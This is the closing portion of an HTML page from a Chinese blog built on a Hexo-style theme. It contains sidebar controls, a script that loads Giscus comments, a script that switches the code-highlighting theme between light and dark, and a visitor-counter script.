fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'AuceptinFang/blog',
      'data-repo-id': 'R_kgDOO_UAjA',
      'data-category-id': 'DIC_kwDOO_UAjM4Cr3mL',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script>
  // 动态切换代码高亮主题
  function switchPrismTheme() {
    const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
    const lightTheme = document.getElementById('prism-light-theme');
    const darkTheme = document.getElementById('prism-dark-theme');
    
    if (lightTheme && darkTheme) {
      lightTheme.disabled = isDark;
      darkTheme.disabled = !isDark;
    }
  }
  
  // 页面加载时执行
  document.addEventListener('DOMContentLoaded', switchPrismTheme);
  
  // 监听主题切换
  const observer = new MutationObserver(switchPrismTheme);
  observer.observe(document.documentElement, {
    attributes: true,
    attributeFilter: ['data-theme']
  });
</script>
<script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>